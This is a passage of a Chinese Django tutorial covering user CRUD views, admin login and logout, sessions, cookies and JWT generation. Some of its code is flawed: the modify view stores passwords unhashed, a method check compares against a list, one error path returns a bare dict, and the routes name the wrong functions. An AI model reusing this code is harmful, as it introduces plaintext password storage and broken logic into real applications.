operator">==</span> <span class="token string">'modify_customer'</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> modifyCustomer<span class="token punctuation">(</span>request<span class="token punctuation">)</span>                <span class="token keyword">elif</span> action <span class="token operator">==</span> <span class="token string">'delete_customer'</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> deleteCustomer<span class="token punctuation">(</span>request<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'不支持该类型http请求'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 转换成json形式'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'没有action字段'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'非管理员'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'flag'</span><span class="token punctuation">:</span> json<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'TokenError'</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><strong>login/urls.py 主路由文件</strong></p><pre class=" language-python"><code class="language-python"> path<span class="token punctuation">(</span><span class="token string">'manager/'</span><span class="token punctuation">,</span>include<span class="token punctuation">(</span><span class="token string">"manager.urls"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><strong>manager/urls.py 管理员路由文件</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> manager <span class="token keyword">import</span> actionurlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>    path<span class="token punctuation">(</span><span class="token string">'customers'</span><span class="token punctuation">,</span>action<span class="token punctuation">.</span>dispatcher<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span></code></pre><h3 id="展示用户"><a href="#展示用户" class="headerlink" title="展示用户"></a>展示用户</h3><p>以统一的json格式给前端返回信息：</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>'ret'<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span> 'retlist'<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span>用户信息<span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>用户信息<span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">]</span></code></pre><p><strong>manager/action.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">listCustomer</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    qs <span class="token operator">=</span> User<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 获取数据表信息</span>    retlist <span class="token operator">=</span> list<span class="token punctuation">(</span>qs<span class="token punctuation">)</span>    <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"ret"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"retlist"</span><span class="token punctuation">:</span> retlist<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p><strong>manager/action.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">addCustomer</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 从post请求获取用户名、密码</span>    userName <span class="token operator">=</span> request<span class="token punctuation">.</span>POST<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>    passwd <span class="token operator">=</span> request<span class="token punctuation">.</span>POST<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>    email <span class="token operator">=</span> request<span class="token punctuation">.</span>POST<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'email'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> userName <span class="token operator">and</span> passwd <span class="token operator">and</span> email<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            user <span class="token operator">=</span> User<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>create_user<span class="token punctuation">(</span>username<span class="token operator">=</span>userName<span class="token punctuation">,</span> password<span class="token operator">=</span>passwd<span class="token punctuation">,</span> email<span class="token operator">=</span>email<span class="token punctuation">)</span>            <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'添加成功'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> IntegrityError<span class="token punctuation">:</span>            <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'用户已存在'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'信息不足'</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h3 id="修改用户"><a href="#修改用户" class="headerlink" title="修改用户"></a>修改用户</h3><p>修改用户使用用户id来区别不同用户，前端需要提供用户的ID以及修改的数据</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">modifyCustomer</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    userId <span class="token operator">=</span> request<span class="token punctuation">.</span>POST<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> userId<span class="token punctuation">:</span>        <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'无id'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        customer <span class="token operator">=</span> User<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>get<span class="token punctuation">(</span>id<span class="token operator">=</span>userId<span class="token punctuation">)</span>    <span class="token keyword">except</span> User<span class="token punctuation">.</span>DoesNotExist<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">"ret"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"msg"</span><span class="token punctuation">:</span> <span class="token string">"用户不存在"</span><span class="token punctuation">}</span>    bodys <span class="token operator">=</span> str<span class="token punctuation">(</span>request<span class="token punctuation">.</span>body<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 获取request请求体</span>    bodys <span class="token operator">=</span> bodys<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">)</span>    body <span class="token operator">=</span> bodys<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 将list转为json</span>    keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    values <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> body<span class="token punctuation">:</span>        item <span class="token operator">=</span> item<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>        keys<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        values<span class="token punctuation">.</span>append<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 对url编码的字符进行解码</span>    bodyJson <span class="token operator">=</span> dict<span class="token punctuation">(</span>zip<span class="token punctuation">(</span>keys<span class="token punctuation">,</span> values<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print("hhhhhhhhh",bodyJson)</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># print("asddadsa")</span>            customer<span class="token punctuation">.</span>username <span class="token operator">=</span> bodyJson<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> IntegrityError<span class="token punctuation">:</span>            <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'已有用户名'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'password'</span> <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        customer<span class="token punctuation">.</span>password <span class="token operator">=</span> bodyJson<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token string">'email'</span> <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        customer<span class="token punctuation">.</span>email <span class="token operator">=</span> bodyJson<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        customer<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 将信息保存到数据库</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'用户已存在'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"msg"</span><span class="token punctuation">:</span> <span class="token string">"已修改用户的信息"</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h3 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h3><p>前端只需提供要删除的用户ID</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 删除用户</span><span class="token keyword">def</span> <span class="token function">deleteCustomer</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    bodys <span class="token operator">=</span> str<span class="token punctuation">(</span>request<span class="token punctuation">.</span>body<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 获取request请求体</span>    bodys <span class="token operator">=</span> bodys<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">)</span>    body <span class="token operator">=</span> bodys<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 将list转为json</span>    keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    values <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> body<span class="token punctuation">:</span>        item <span class="token operator">=</span> item<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>        keys<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        values<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    bodyJson <span class="token operator">=</span> dict<span class="token punctuation">(</span>zip<span class="token punctuation">(</span>keys<span class="token punctuation">,</span> values<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> bodyJson<span class="token punctuation">:</span>        username <span class="token operator">=</span> bodyJson<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            customer <span class="token operator">=</span> User<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>get<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 查找id用户</span>            customer<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'msg'</span><span class="token punctuation">:</span><span class="token string">'删除成功'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> User<span class="token punctuation">.</span>DoesNotExist<span class="token punctuation">:</span>            <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'用户不存在'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span> <span class="token string">'需要用户名'</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h2 id="实现登录-登出"><a href="#实现登录-登出" class="headerlink" title="实现登录/登出"></a>实现登录/登出</h2><h3 id="请求参数"><a href="#请求参数" class="headerlink" title="请求参数"></a>请求参数</h3><p>http请求消息body中 参数是以格式 <font color=orange>x-www-form-urlencoded</font> 存储，需要携带<font color=orange>username</font> 和 <font color=orange>password</font> 两个参数</p><ul><li>username=xxxx&amp;password=xxxx</li></ul><blockquote><p>Django存储的密码是以HASH算法加密的，所以比对密码需要对密码进行HASH操作再比对</p></blockquote><p>Django项目创建后，会自动创建auth_user表，以auth_user表中的 <font color=orange>is superuser</font> 字段判断是否为超级管理员</p><h3 id="管理员登录代码"><a href="#管理员登录代码" class="headerlink" title="管理员登录代码"></a>管理员登录代码</h3><p>在管理员对应的项目目录下新增 sign_in_out.py 文件</p><p><strong>manager/sign_in_out.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#登录</span><span class="token keyword">def</span> <span class="token function">signin</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#从HTTP POST请求中获取用户名、密码参数</span>    userName <span class="token operator">=</span> request<span class="token punctuation">.</span>POST<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>    passWord <span class="token operator">=</span> request<span class="token punctuation">.</span>POST<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#使用Django auth库里的方法校验用户名、密码</span>    user <span class="token operator">=</span> authenticate<span class="token punctuation">(</span>username<span class="token operator">=</span>userName<span class="token punctuation">,</span>password<span class="token operator">=</span>passWord<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print("id",user.id)</span>    <span class="token triple-quoted-string string">'''    ret 0 : 普通用户登录成功        1 : 登录失败        2 : 管理员登录成功    '''</span>    <span class="token comment" spellcheck="true">#如果能找到用户，并且密码正确</span>    <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#user_auth表中的字段</span>        <span class="token keyword">if</span> user<span class="token punctuation">.</span>is_active<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#该账号为管理员账号</span>            <span class="token keyword">if</span> user<span class="token punctuation">.</span>is_superuser<span class="token punctuation">:</span>                login<span class="token punctuation">(</span>request<span class="token punctuation">,</span> user<span class="token punctuation">)</span>                request<span class="token punctuation">.</span>session<span class="token punctuation">[</span><span class="token string">'usertype'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'manager'</span> <span class="token comment" spellcheck="true">#对应数据库django_session表中的session_data(加密)</span>                token <span class="token operator">=</span> createJwt<span class="token punctuation">(</span>user<span class="token punctuation">.</span>username<span class="token punctuation">,</span>user<span class="token punctuation">.</span>id<span class="token punctuation">)</span>                <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"ret"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'token'</span><span class="token punctuation">:</span>token<span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                login<span class="token punctuation">(</span>request<span class="token punctuation">,</span> user<span class="token punctuation">)</span>                token <span class="token operator">=</span> createJwt<span class="token punctuation">(</span>user<span class="token punctuation">.</span>username<span class="token punctuation">,</span>user<span class="token punctuation">.</span>id<span class="token punctuation">)</span>                <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"ret"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'token'</span><span class="token punctuation">:</span>token<span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"ret"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"用户已被禁用"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'msg'</span><span class="token punctuation">:</span><span class="token string">'用户不存在'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#登出</span><span class="token keyword">def</span> <span class="token function">signout</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    logout<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"ret"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p><strong>manager/urls.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> manager <span class="token keyword">import</span> sign_in_outurlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>    path<span class="token punctuation">(</span><span class="token string">'signin'</span><span class="token punctuation">,</span>sign_in_out<span class="token punctuation">.</span>login<span class="token punctuation">)</span><span class="token punctuation">,</span>    path<span class="token punctuation">(</span><span class="token string">'signout'</span><span class="token punctuation">,</span>sign_in_out<span class="token punctuation">.</span>logout<span class="token punctuation">)</span><span class="token punctuation">]</span></code></pre><h2 id="session-cookie-token"><a href="#session-cookie-token" class="headerlink" title="session /cookie/token"></a>session /cookie/token</h2><p>我们在处理用户请求前，应该判断发出请求的用户是否登录了。对于请求消息的合法性验证，通常有两种方案 ： <font color=orange>session  和 cookie</font></p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p><strong>session</strong> 就是 <strong>会话</strong> 的意思</p><p>session 的原理如下：</p><ul><li>服务端在数据库中保存一张session表，这张表记录了一次用户登录的相关信息。具体记录的信息，不同的系统各有差异，通常会记录该用户的ID、姓名、登录名之类的</li></ul><p>Django中该表的名字就叫 <font color=orange> django_session</font> ，如下图所示</p><p><img src="https://img.imgdb.cn/item/60470f7f5aedab222c6dc42f.png" alt=""></p><blockquote><p>sessionId通常就是一串字符串来标记一个session的，而session 对应的数据在这里是加密的</p></blockquote><p>通过上面这张表，服务端可以根据session号(sessionId) 查到 session 的信息数据。</p><p>在用户登录成功后，服务端就在数据库session表中 创建一条记录，记录这次会话，也就是创建一个新的 sessionId 插入到该表中，同时写入一些该 session 对应的数据到记录的数据字段中，比如登录用户的信息。然后在该登录请求的http响应消息中的 <font color=orange> Set-Cookie</font> 里填入sessionId数据。</p><p>根据http协议，这个Set-Cookie字段的意思就是 要求前端将其中的数据存入cookie中。并且随后访问该服务端的时候，在HTTP请求消息中必须带上这些cookie 数据。</p><p>cookie 通常就是存储在客户端浏览器的一些数据，服务器可以通过http响应消息要求浏览器存储一些数据。</p><p>以后每次访问同一个网站的服务，必须在HTTP请求中再带上这些cookie里的数据。</p><p>cookie数据由多个键值对组成，比如：</p><pre><code>sessionid=xxxxusername=xxxxfavorite=phone_laptop_watch</code></pre><ul><li>该用户的后续操作，触发的HTTP请求，都会在请求头的Cookie字段带上前面说的sessionid 。</li></ul><p>服务端接收到该请求后，只需要到<font color=orange> session </font>表中查看是否有该 sessionid 对应的记录，这样就可以判断这个请求是否是前面已经登录的用户发出的。如果不是，就可以拒绝服务，重定向http请求到登录页面让用户登录。</p><h3 id="使用session验证客户端请求"><a href="#使用session验证客户端请求" class="headerlink" title="使用session验证客户端请求"></a>使用session验证客户端请求</h3><p>验证请求的cookie里是否有sessionid ，并检查session表，看看是否存在session_key为该sessionid的一条记录，该记录的数据字典里面是否包含了usertype 为 <font color=orange>manager</font> 的数据</p><p><strong>manager/action.py</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">dispatcher</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#根据session判断用户是否为登录的管理员</span>    <span class="token keyword">if</span> <span class="token string">'usertype'</span> <span class="token operator">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>session<span class="token punctuation">:</span>        <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token string">'msg'</span><span class="token punctuation">:</span><span class="token string">'未登录'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>status<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>session<span class="token punctuation">[</span><span class="token string">'usertype'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"manager"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token string">'msg'</span><span class="token punctuation">:</span><span class="token string">'非管理员'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>status<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#将请求参数统一放入request的params属性中，方便后续处理</span>    <span class="token comment" spellcheck="true">#GET请求参数在request对象的GET属性中</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>params <span class="token operator">=</span> request<span class="token punctuation">.</span>GET    <span class="token keyword">elif</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'PUT'</span><span class="token punctuation">,</span><span class="token string">'DELETE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>params <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>body<span class="token punctuation">)</span>    action <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> action <span class="token operator">==</span> <span class="token string">'list_customer'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> listCustomer<span class="token punctuation">(</span>request<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#处理函数</span>    <span class="token keyword">elif</span> action <span class="token operator">==</span> <span class="token string">'add_customer'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> addCustomer<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    <span class="token keyword">elif</span> action <span class="token operator">==</span> <span class="token string">'modify_customer'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> modifyCustomer<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    <span class="token keyword">elif</span> action <span class="token operator">==</span> <span class="token string">'delete_customer'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> deleteCustomer<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'msg'</span><span class="token punctuation">:</span><span class="token string">'不支持该类型http请求'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#转换成json形式</span></code></pre><h3 id="JWT-Json-Web-Token"><a href="#JWT-Json-Web-Token" class="headerlink" title="JWT(Json Web Token)"></a>JWT(Json Web Token)</h3><p>用户登录，服务端给用户返回一个token(服务端不保存)，以后用户再来访问，需要携带token，服务端获取token后，再做token的校验</p><blockquote><p>相较于传统的token，它无需在服务器保存token</p></blockquote><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><ol><li>用户提交用户名和密码给服务器。如果登录成功，使用jwt创建一个token，并给用户返回。（<a href="http://jwt.io）" target="_blank" rel="noopener">http://jwt.io）</a></li></ol><p><a href="https://imgtu.com/i/63skRA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/09/63skRA.png" alt="63skRA.png"></a></p><ol start="2"><li>以后用户再来访问的时候，需要携带token，后端需要对token进行校验</li></ol><ul><li>获取token</li><li>对token进行分割，分割成三段字符串</li><li>对第二段进行base64解密，并获取payload信息，检测token是否超时</li><li>把第一二段拼接，再次执行生成token相同的加密操作，将第三段字符串进行base64解密，将两个token进行比较，与如果相等，证明token未被修改(认证通过)</li></ul><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>python 中的 <font color=orange>pyjwt</font> 库实现了jwt算法，安装：</p><pre><code>pip install pyjwt</code></pre><h6 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h6><p><strong>生成token</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">import</span> datetime<span class="token keyword">def</span> <span class="token function">createJwt</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>userId<span class="token punctuation">)</span><span class="token punctuation">:</span>    salt <span class="token operator">=</span> settings<span class="token punctuation">.</span>SECRET_KEY <span class="token comment" spellcheck="true">#随机字符串</span>    <span class="token comment" spellcheck="true">#构造Header</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'typ'</span><span class="token punctuation">:</span><span class="token string">'jwt'</span><span class="token punctuation">,</span>        <span class="token string">'alg'</span><span class="token punctuation">:</span><span class="token 